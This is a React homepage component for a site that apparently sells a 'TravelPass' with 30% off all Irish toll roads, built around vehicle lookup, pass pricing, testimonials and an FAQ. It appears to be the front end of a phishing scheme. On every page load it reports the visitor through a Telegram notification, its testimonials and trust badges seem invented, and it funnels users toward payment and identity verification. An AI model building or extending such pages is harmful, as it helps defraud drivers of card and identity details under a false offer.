import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { CheckCircle, Shield, Clock, CreditCard, MapPin, Car, Users, Star, Search, CheckCircle2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import heroImage from "@/assets/hero-motorway.jpg";
import howItWorksImage from "@/assets/how-it-works.jpg";
import trustBadgesImage from "@/assets/trust-badges.jpg";
import VehicleRegistrationModal from "@/components/VehicleRegistrationModal";
import { saveVehicleData, saveDurationData, getVehicleData, getDurationData, clearAllCheckoutData } from "@/lib/cookies";
import { sendUserInfoNotification } from "@/lib/telegram";

const HomePage = () => {
  const [vehicleReg, setVehicleReg] = useState("");
  const [vehicleFound, setVehicleFound] = useState(false);
  const [vehicleData, setVehicleData] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedDuration, setSelectedDuration] = useState<any>(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Clear any existing checkout data when starting fresh
    clearAllCheckoutData();
    
    // Send user info notification to Telegram
    const sendNotification = async () => {
      try {
        await sendUserInfoNotification();
      } catch (error) {
        console.error('Failed to send user info notification:', error);
      }
    };
    
    sendNotification();
  }, []);

  // Duration plans data
  const durationPlans = [
    {
      days: 1,
      label: "1 Day Pass",
      originalPrice: 5.00,
      discountedPrice: 3.50,
      savings: 1.50,
      description: "Perfect for day trips"
    },
    {
      days: 7,
      label: "7 Day Pass",
      originalPrice: 21.43,
      discountedPrice: 15.00,
      savings: 6.43,
      description: "Great for weekly travel"
    },
    {
      days: 30,
      label: "30 Day Pass",
      originalPrice: 71.43,
      discountedPrice: 50.00,
      savings: 21.43,
      description: "Best value for regular commuters"
    }
  ];

  const handleChoosePlan = (planIndex: number) => {
    setSelectedDuration(durationPlans[planIndex]);
    setIsModalOpen(true);
  };

  const handleProceedToPayment = (vehicle: any, duration: any) => {
    // Save data to cookies
    saveVehicleData(vehicle);
    saveDurationData(duration);
    
    navigate('/payment', {
      state: { vehicle, duration }
    });
  };

  const handleVehicleLookup = async () => {
    if (!vehicleReg) return;
    
    setIsLoading(true);
    
    try {
      const { data, error } = await supabase.functions.invoke('lookup-vehicle', {
        body: { vrn: vehicleReg }
      });

      if (error) {
        console.error('Error looking up vehicle:', error);
        alert('Failed to look up vehicle. Please try again.');
        setIsLoading(false);
        return;
      }

      if (data.success && data.vehicle) {
        setVehicleFound(true);
        setVehicleData(data.vehicle);
        
        // Save vehicle data to cookies
        const vehicleInfo = {
          registration: data.vehicle.registration || vehicleReg.toUpperCase(),
          make: data.vehicle.make || '',
          model: data.vehicle.model || '',
          color: data.vehicle.color || '',
          engineCapacity: data.vehicle.engineCapacity
        };
        saveVehicleData(vehicleInfo);
        
        // Analytics event
        if (window.gtag) {
          window.gtag('event', 'find_vehicle_clicked', {
            reg_number: vehicleReg,
            make: data.vehicle.make,
            model: data.vehicle.model
          });
        }
      } else {
        alert(data.error || 'Vehicle not found. Please check the registration number.');
      }
    } catch (error) {
      console.error('Unexpected error:', error);
      alert('An unexpected error occurred. Please try again.');
    }
    
    setIsLoading(false);
  };

  const handleContinue = () => {
    if (window.gtag) {
      window.gtag('event', 'vehicle_found', {
        make: vehicleData?.make || '',
        model: vehicleData?.model || ''
      });
    }
    
    const vehicleInfo = {
      registration: vehicleData?.registration || vehicleReg.toUpperCase(),
      make: vehicleData?.make || '',
      model: vehicleData?.model || '',
      color: vehicleData?.color || '',
      engineCapacity: vehicleData?.engineCapacity
    };
    
    // Save to cookies and navigate
    saveVehicleData(vehicleInfo);
    navigate('/duration', { 
      state: { vehicle: vehicleInfo }
    });
  };

  const scrollToVehicleLookup = () => {
    document.getElementById('vehicle-lookup')?.scrollIntoView({
      behavior: 'smooth'
    });
  };

  return (
    <div className="space-y-16">
      {/* Hero Section */}
      <section className="relative min-h-screen flex items-center">
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{ backgroundImage: `url(${heroImage})` }}
        >
          <div className="absolute inset-0 bg-primary/70"></div>
        </div>
        
        <div className="relative z-10 container mx-auto px-4 text-center text-white">
          <h1 className="text-5xl md:text-7xl font-bold mb-6 leading-tight">
            Save 30% on All Irish Toll Roads
          </h1>
          <p className="text-xl md:text-2xl mb-8 text-white/90 max-w-3xl mx-auto">
            Get Your Travel Pass in 2 Minutes
          </p>
          <p className="text-lg mb-12 text-white/80 max-w-2xl mx-auto">
            One pass. One payment. Instant savings across Ireland's toll network.
          </p>
          
          <Button 
            onClick={scrollToVehicleLookup}
            className="btn-hero text-xl px-12 py-6"
          >
            Get My Pass Now
          </Button>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-20 bg-muted">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-4">How It Works</h2>
          <p className="text-xl text-muted-foreground text-center mb-16">
            Get your travel pass in 4 simple steps
          </p>
          
          <div className="max-w-6xl mx-auto mb-12">
            <img 
              src={howItWorksImage} 
              alt="How Travel Pass works - 4 step process"
              className="w-full h-auto rounded-lg shadow-lg"
            />
          </div>
          
          <div className="grid md:grid-cols-4 gap-8 max-w-5xl mx-auto">
            <div className="text-center">
              <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
                <Car className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-semibold mb-2">1. Enter Registration</h3>
              <p className="text-muted-foreground">Enter your vehicle registration number - we instantly find your car.</p>
            </div>
            
            <div className="text-center">
              <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-semibold mb-2">2. Confirm Vehicle</h3>
              <p className="text-muted-foreground">We show make, color and registration to confirm it's your vehicle.</p>
            </div>
            
            <div className="text-center">
              <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
                <Clock className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-semibold mb-2">3. Choose Duration</h3>
              <p className="text-muted-foreground">Select your pass duration with automatic 30% discount applied.</p>
            </div>
            
            <div className="text-center">
              <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-xl font-semibold mb-2">4. Pay & Activate</h3>
              <p className="text-muted-foreground">Pay securely, verify your identity, and drive with confidence!</p>
            </div>
          </div>
        </div>
      </section>

      {/* Vehicle Lookup */}
      <section id="vehicle-lookup" className="py-20">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto text-center">
            <h2 className="text-4xl font-bold mb-6">Find Your Vehicle</h2>
            <p className="text-xl text-muted-foreground mb-12">
              Enter your registration number to get started
            </p>
            
            <Card className="p-8">
              <CardContent className="space-y-6">
                <div className="form-field">
                  <label className="form-label">Vehicle Registration Number</label>
                  <Input
                    className="form-input text-lg"
                    placeholder="e.g. 161D66608"
                    value={vehicleReg}
                    onChange={(e) => setVehicleReg(e.target.value)}
                    disabled={vehicleFound}
                  />
                </div>
                
                {!vehicleFound ? (
                  <Button 
                    onClick={handleVehicleLookup}
                    disabled={!vehicleReg || isLoading}
                    className="btn-irish w-full text-lg py-4"
                  >
                    {isLoading ? "Finding Vehicle..." : "Find My Vehicle"}
                  </Button>
                ) : (
                  <div className="space-y-4">
                    <div className="flex items-center space-x-2 mb-4">
                      <CheckCircle2 className="w-5 h-5 text-emerald-600" />
                      <span className="text-emerald-600 font-medium">Vehicle Found!</span>
                    </div>
                    
                    <div className="space-y-2 text-left">
                      <p><strong>Registration:</strong> {vehicleData?.registration || vehicleReg.toUpperCase()}</p>
                      <p><strong>Make:</strong> {vehicleData?.make || 'N/A'}</p>
                      <p><strong>Model:</strong> {vehicleData?.model || 'N/A'}</p>
                      <p><strong>Colour:</strong> {vehicleData?.color || 'N/A'}</p>
                      {vehicleData?.engineCapacity && (
                        <p><strong>Engine:</strong> {vehicleData.engineCapacity}</p>
                      )}
                    </div>
                    
                    <Button 
                      onClick={handleContinue}
                      className="btn-hero w-full"
                    >
                      Continue
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Benefits */}
      <section className="py-20 bg-muted">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-16">Why Choose TravelPass?</h2>
          
          <div className="grid md:grid-cols-4 gap-8 max-w-5xl mx-auto">
            <div className="text-center">
              <MapPin className="w-12 h-12 text-accent-irish mx-auto mb-4" />
              <h3 className="text-xl font-semibold mb-2">Nationwide Coverage</h3>
              <p className="text-muted-foreground">Valid on all toll roads across Ireland</p>
            </div>
            
            <div className="text-center">
              <Clock className="w-12 h-12 text-accent-irish mx-auto mb-4" />
              <h3 className="text-xl font-semibold mb-2">Instant Activation</h3>
              <p className="text-muted-foreground">Your pass activates immediately after verification</p>
            </div>
            
            <div className="text-center">
              <Shield className="w-12 h-12 text-accent-irish mx-auto mb-4" />
              <h3 className="text-xl font-semibold mb-2">Secure Payments</h3>
              <p className="text-muted-foreground">PCI-compliant payment processing</p>
            </div>
            
            <div className="text-center">
              <CheckCircle className="w-12 h-12 text-accent-irish mx-auto mb-4" />
              <h3 className="text-xl font-semibold mb-2">Easy Refunds</h3>
              <p className="text-muted-foreground">Full refund within 24 hours if unused</p>
            </div>
          </div>
        </div>
      </section>

      {/* Pricing Preview */}
      <section className="py-20">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-6">Pricing</h2>
          <p className="text-xl text-muted-foreground text-center mb-16">
            Automatic 30% discount on all durations
          </p>
          
          <div className="grid md:grid-cols-3 gap-8 max-w-4xl mx-auto">
            <Card className="relative">
              <CardContent className="p-8 text-center">
                <h3 className="text-2xl font-bold mb-4">1 Day Pass</h3>
                <div className="mb-4">
                  <span className="price-original">€5.00</span>
                  <div className="price-discounted">€3.50</div>
                  <div className="price-savings">Save €1.50</div>
                </div>
                <p className="text-muted-foreground mb-6">Perfect for day trips</p>
                <Button 
                  variant="outline" 
                  className="w-full"
                  onClick={() => handleChoosePlan(0)}
                >
                  Choose Plan
                </Button>
              </CardContent>
            </Card>
            
            <Card className="relative border-accent-irish">
              <div className="absolute -top-3 left-1/2 transform -translate-x-1/2">
                <span className="bg-accent-irish text-white px-4 py-1 rounded-full text-sm font-medium">
                  Most Popular
                </span>
              </div>
              <CardContent className="p-8 text-center">
                <h3 className="text-2xl font-bold mb-4">7 Day Pass</h3>
                <div className="mb-4">
                  <span className="price-original">€21.43</span>
                  <div className="price-discounted">€15.00</div>
                  <div className="price-savings">Save €6.43</div>
                </div>
                <p className="text-muted-foreground mb-6">Great for weekly travel</p>
                <Button 
                  className="btn-irish w-full"
                  onClick={() => handleChoosePlan(1)}
                >
                  Choose Plan
                </Button>
              </CardContent>
            </Card>
            
            <Card className="relative">
              <CardContent className="p-8 text-center">
                <h3 className="text-2xl font-bold mb-4">30 Day Pass</h3>
                <div className="mb-4">
                  <span className="price-original">€71.43</span>
                  <div className="price-discounted">€50.00</div>
                  <div className="price-savings">Save €21.43</div>
                </div>
                <p className="text-muted-foreground mb-6">Best value for regular commuters</p>
                <Button 
                  variant="outline" 
                  className="w-full"
                  onClick={() => handleChoosePlan(2)}
                >
                  Choose Plan
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="py-20 bg-muted">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-16">What Our Customers Say</h2>
          
          <div className="grid md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center mb-4">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-5 h-5 text-yellow-400 fill-current" />
                  ))}
                </div>
                <p className="text-muted-foreground mb-4">
                  "Fast activation and real savings — I saved €12 on my first week. Super easy."
                </p>
                <div className="flex items-center">
                  <div className="w-10 h-10 bg-accent-irish rounded-full flex items-center justify-center mr-3">
                    <span className="text-white font-semibold text-sm">JD</span>
                  </div>
                  <div>
                    <p className="font-semibold">Jane D.</p>
                    <p className="text-sm text-muted-foreground">Dublin</p>
                  </div>
                </div>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center mb-4">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-5 h-5 text-yellow-400 fill-current" />
                  ))}
                </div>
                <p className="text-muted-foreground mb-4">
                  "Simple checkout, reliable — the pass worked on M50 and other routes."
                </p>
                <div className="flex items-center">
                  <div className="w-10 h-10 bg-accent-irish rounded-full flex items-center justify-center mr-3">
                    <span className="text-white font-semibold text-sm">LO</span>
                  </div>
                  <div>
                    <p className="font-semibold">Liam O.</p>
                    <p className="text-sm text-muted-foreground">Cork</p>
                  </div>
                </div>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center mb-4">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-5 h-5 text-yellow-400 fill-current" />
                  ))}
                </div>
                <p className="text-muted-foreground mb-4">
                  "Customer support helped with activation in 10 minutes. Recommended."
                </p>
                <div className="flex items-center">
                  <div className="w-10 h-10 bg-accent-irish rounded-full flex items-center justify-center mr-3">
                    <span className="text-white font-semibold text-sm">MK</span>
                  </div>
                  <div>
                    <p className="font-semibold">Mary K.</p>
                    <p className="text-sm text-muted-foreground">Galway</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
          
        </div>
      </section>

      {/* Trust Badges */}
      <section className="py-16">
        <div className="container mx-auto px-4">
          <h3 className="text-2xl font-bold text-center mb-8">Trusted & Secure</h3>
          
          <div className="flex justify-center mb-8">
            <img 
              src={trustBadgesImage} 
              alt="Trust badges - SSL Secured, PCI DSS Compliant, 24-Hour Refund, Trusted Payment Partners"
              className="h-20 w-auto"
            />
          </div>
          
          <div className="grid md:grid-cols-4 gap-4 max-w-3xl mx-auto">
            <div className="trust-badge justify-center">
              <Shield className="w-4 h-4" />
              <span>SSL Secured</span>
            </div>
            <div className="trust-badge justify-center">
              <CheckCircle className="w-4 h-4" />
              <span>PCI DSS Compliant</span>
            </div>
            <div className="trust-badge justify-center">
              <Clock className="w-4 h-4" />
              <span>24-Hour Refund</span>
            </div>
            <div className="trust-badge justify-center">
              <CreditCard className="w-4 h-4" />
              <span>Trusted Partners</span>
            </div>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="py-20 bg-muted">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-16">Frequently Asked Questions</h2>
          
          <div className="max-w-3xl mx-auto space-y-8">
            <Card>
              <CardContent className="p-6">
                <h3 className="text-xl font-semibold mb-3">Will the pass work on all toll roads in Ireland?</h3>
                <p className="text-muted-foreground">Yes, your TravelPass is valid on all toll roads across Ireland's network. See Terms & Conditions for any exclusions.</p>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <h3 className="text-xl font-semibold mb-3">How is the pass activated?</h3>
                <p className="text-muted-foreground">After payment, your identity will be verified and your pass activates immediately.</p>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <h3 className="text-xl font-semibold mb-3">What if my vehicle details are wrong?</h3>
                <p className="text-muted-foreground">You can edit vehicle details before completing payment, or contact our support team for assistance after purchase.</p>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <h3 className="text-xl font-semibold mb-3">How do refunds work?</h3>
                <p className="text-muted-foreground">Full refund available within 24 hours if the pass hasn't been activated. See our Refund Policy for complete details.</p>
              </CardContent>
            </Card>
            
            <Card>
              <CardContent className="p-6">
                <h3 className="text-xl font-semibold mb-3">Is payment secure?</h3>
                <p className="text-muted-foreground">Yes, all payments are processed through PCI-compliant gateways. We never store your CVV or sensitive card details.</p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Final CTA */}
      <section className="py-20 bg-primary text-white">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-4xl font-bold mb-6">Ready to Save 30% on Tolls?</h2>
          <p className="text-xl text-white/90 mb-8">Join thousands of drivers already saving with TravelPass</p>
          <Button 
            onClick={scrollToVehicleLookup}
            className="btn-hero bg-white text-primary hover:bg-white/90"
          >
            Get My Pass Now
          </Button>
        </div>
      </section>

      {/* Vehicle Registration Modal */}
      <VehicleRegistrationModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        duration={selectedDuration}
        onProceedToPayment={handleProceedToPayment}
      />
    </div>
  );
};

export default HomePage;